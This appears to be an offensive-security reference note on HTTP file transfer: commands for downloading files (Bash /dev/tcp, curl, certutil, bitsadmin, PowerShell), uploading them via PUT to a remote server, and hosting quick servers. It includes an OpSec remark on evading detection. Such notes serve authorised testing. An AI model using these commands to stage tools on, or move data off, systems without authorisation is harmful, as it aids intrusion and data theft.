---
title: HTTP File Transfer
---

[[notes/file-transfer/index]] over the [[notes/network/http]] protocol.

# Download via GET

Pure Bash ([source](https://pastebin.com/H0EJLdjc)).

~~~ bash
function curl() {
  exec 3<> "/dev/tcp/$1/$2"
  echo -en "GET $3 HTTP/1.0\r\nHost: $1\r\n\r\n" >&3
  (
    while read line; do
      [[ "$line" == $'\r' ]] && break
    done && cat
  ) <&3
  exec 3>&-
}
curl 192.0.2.1 8080 /input.bin > ./output.bin
~~~

Common Linux utilities.

~~~ bash
curl -o ./output.bin http://192.0.2.1:8080/input.bin
wget -O ./output.txt http://192.0.2.1:8080/input.txt
~~~

Windows builtins.

~~~ bat
certutil.exe -urlcache -f http://192.0.2.1:8080/input.bin .\output.bin
bitsadmin.exe /transfer myjob http://192.0.2.1:8080/input.bin %cd%\output.bin
~~~

`curl.exe` is preinstalled since Windows 10.

PowerShell variants.

~~~ powershell
iwr http://192.0.2.1:8080/input.bin -useb -outf .\output.bin
Invoke-WebRequest -Uri http://192.0.2.1:8080/input.bin -UseBasicParsing -OutFile .\output.bin
irm http://192.0.2.1:8080/intput.txt > ./output.txt
Invoke-RestMethod http://192.0.2.1:8080/intput.txt > ./output.txt
(New-Object System.Net.WebClient).DownloadFile('http://192.0.2.1:8080/input.bin',"$(pwd)\output.bin")  # doesnt work in constrained language mode
~~~

> **OpSec:** Mature organizations probably have detection rules for the Windows builtins.

# Upload via PUT

Linux utility.

~~~ bash
curl -T ./input.bin http://192.0.2.1:8080/output.bin
~~~

PowerShell.

~~~ powershell
(New-Object System.Net.WebClient).UploadFile('http://192.0.2.1:8080/output.bin', "$(pwd)\input.bin")  # doesn't work in constrained languge mode
~~~

# Server

Python.

~~~ bash
python3 -m http.server 8080
python2 -m SimpleHTTPServer 8080
~~~

PHP.

~~~ bash
php -S 0.0.0.0:8080
~~~

Ruby.

~~~ bash
ruby -run -e httpd . -p 8080
~~~

Linux Busybox.

~~~ bash
busybox httpd -f -p 8080
~~~

Nginx with authentication and file upload.

`./nginx.conf`:

~~~
http {
  server {
    server_name localhost;
    listen 8080 default_server;
    listen [::]:8080 default_server;

    auth_basic "Restricted";
    auth_basic_user_file ./htpasswd;

    location / {
      root ./srv;
      dav_methods PUT;
      dav_access user:rw group:rw all:r;
      create_full_put_path on;
      autoindex on;
      client_max_body_size 128m;
    }
  }

  client_body_temp_path ./tmp;
  access_log /dev/stdout;
  log_not_found off;

  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  types_hash_max_size 4096;

  server_tokens off;

  charset utf-8;
  default_type application/octet-stream;
  types {
    text/css css;
    text/html html;
    text/javascript js;
  }
}

events {
  multi_accept on;
  worker_connections 1024;
}

pid /dev/shm/nginx.pid;
worker_processes auto;
worker_rlimit_nofile 2048;
daemon off;
pcre_jit on;
error_log /dev/stderr;
~~~

~~~ bash
mkdir ./srv ./tmp
echo "admin:$(echo 'passw0rd' | openssl passwd -stdin -apr1)" > ./htpasswd
nginx -p . -c ./nginx.conf
~~~

Untested tools:

- [skyhook](https://github.com/blackhillsinfosec/skyhook), HTTP file server with builtin transport obfuscation
- [updog](https://github.com/sc0tfree/updog), HTTP file server with up- and download

References:

- [twitter.com/RedTeamTactics/status/1689649961544425474](https://twitter.com/RedTeamTactics/status/1689649961544425474), upload to Azure Blob Container with `curl`
